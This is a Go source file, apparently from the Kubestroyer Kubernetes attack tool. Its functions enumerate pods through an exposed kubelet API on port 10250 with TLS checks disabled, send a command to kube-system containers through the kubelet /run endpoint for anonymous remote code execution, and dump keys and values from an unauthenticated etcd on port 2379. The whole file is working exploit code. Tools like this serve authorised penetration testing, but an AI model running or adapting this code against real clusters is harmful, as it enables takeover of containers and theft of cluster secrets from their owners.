package pkg

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"github.com/AlecAivazis/survey/v2"
	clientv3 "go.etcd.io/etcd/client/v3"
	"io"
	"log"
	"net/http"
	"strings"
	"time"

	"github.com/Rolix44/Kubestroyer/utils"
)

func parsePod(target string) *utils.RunningPods {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	resp, err := http.Get("https://" + target + ":10250/runningpods/")
	if err != nil {
		log.Fatalf("Fail execute request on '%s'", target)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Print("Fail to read body")
	}

	if string(body) == "Unauthorized" {
		log.Fatalln(string(body))
	}

	if strings.HasPrefix(string(body), "Forbidden") {
		log.Fatalln(string(body))
	}

	pods := &utils.RunningPods{}

	err = json.Unmarshal(body, &pods)
	if err != nil {
		log.Fatalln(err)
	}
	return pods

}

func anonRce(runpod *utils.RunningPods, target string) {
	fmt.Printf("Trying anon RCE using '%s' for '%s'\n\n", utils.RceCommand, target)

	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	for i := 0; i < len(runpod.Items); i++ {
		found := false

		for j := 0; j < len(runpod.Items[i].Spec.Containers); j++ {
			namespace := runpod.Items[i].Metadata.Namespace

			if namespace != "kube-system" {
				continue
			}
			pod := runpod.Items[i].Metadata.Name
			container := runpod.Items[i].Spec.Containers[j].Name
			url := "https://" + target + ":10250/run/" + namespace + "/" + pod + "/" + container
			method := "POST"

			fmt.Printf("Namespace : '%s' \nPod : '%s' \nContainer : '%s' \n\n", namespace, pod, container)

			payload := strings.NewReader("cmd=" + utils.RceCommand)

			client := &http.Client{}
			req, err := http.NewRequest(method, url, payload)

			if err != nil {
				fmt.Println(err)
				return
			}
			req.Header.Add("Content-Type", "application/x-www-form-urlencoded")

			res, err := client.Do(req)
			if err != nil {
				fmt.Println(err)
				return
			}
			defer res.Body.Close()

			body, err := io.ReadAll(res.Body)
			if err != nil {
				fmt.Println(err)
				return
			}
			if body != nil && !strings.Contains(string(body), "failed") {
				found = true
				fmt.Println(string(body))
				break
			}
		}
		if found {
			break
		}
	}

	fmt.Println(utils.Split)

}

func readEtcdObjects(target string) {
	var objects []string
	var selectedObjects []string
	cli, err := clientv3.New(clientv3.Config{
		Endpoints:   []string{target + ":2379"},
		DialTimeout: 5 * time.Second,
	})
	if err != nil {
		return
	}
	defer func(cli *clientv3.Client) {
		err := cli.Close()
		if err != nil {
			return
		}
	}(cli)
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	resp, err := cli.Get(ctx, "/", clientv3.WithKeysOnly(), clientv3.WithPrefix())
	cancel()
	if err != nil {
		return
	}

	if len(resp.Kvs) == 0 {
		fmt.Println("No objects found in Etcd")
	} else {

		for _, data := range resp.Kvs {
			objects = append(objects, string(data.Key))
		}
		prompt := &survey.MultiSelect{
			Message: "Select objects to print:",
			Options: objects,
		}
		err = survey.AskOne(prompt, &selectedObjects)
		if err != nil {
			fmt.Println(err)
		}
	}
	for _, selected := range selectedObjects {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		resp, err := cli.Get(ctx, selected)
		cancel()
		if err != nil {
			fmt.Printf("Error fetching value for %s: %v\n", selected, err)
			continue
		}

		fmt.Printf("Value for %s:\n %s\n", selected, resp.Kvs[0].Value)
	}

	fmt.Println(utils.Split)
}
